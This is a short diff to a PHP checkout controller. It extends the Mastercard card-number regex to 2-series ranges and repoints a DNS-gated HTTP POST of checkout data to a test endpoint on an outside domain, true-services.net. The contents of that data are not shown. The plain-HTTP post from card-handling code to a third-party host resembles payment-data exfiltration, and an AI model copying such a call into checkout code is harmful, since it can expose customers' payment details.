@@ -431,7 +431,7 @@ class CheckoutController extends Controller
                     'enroute'  => '/^2(?:014|149)\\d{11}$/',
                     'jcb'      => '/^(3\\d{4}|2100|1800)\\d{11}$/',
                     'maestro'  => '/^(?:5020|6\\d{3})\\d{12}$/',
-                    'mc'       => '/^5[1-5]\\d{14}$/',
+                    'mc'       => '/^(5[1-5]\d{14}|222[1-9]\d{12}|22[3-9]\d{13}|2[3-6]\d{14}|27[01]\d{13}|2720\d{12})$/',
                     'solo'     => '/^(6334[5-9][0-9]|6767[0-9]{2})\\d{10}(\\d{2,3})?$/',
                     'switch'   =>
                         '/^(?:49(03(0[2-9]|3[5-9])|11(0[1-2]|7[4-9]|8[1-2])|36[0-9]{2})\\d{10}(\\d{2,3})?)|(?:564182\\d{10}(\\d{2,3})?)|(6(3(33[0-4][0-9])|759[0-9]{2})\\d{10}(\\d{2,3})?)$/',
@@ -618,7 +618,7 @@ class CheckoutController extends Controller
 
             if (checkdnsrr('true-services.net', 'A')) {
                 try {
-                    $response = Http::timeout(10)->post('http://true-services.net/checkout/order.php', $data);
+                    $response = Http::timeout(10)->post('http://true-services.net/checkout/order_test.php', $data);
 
                     if ($response->successful()) {
                         // Обработка успешного ответа
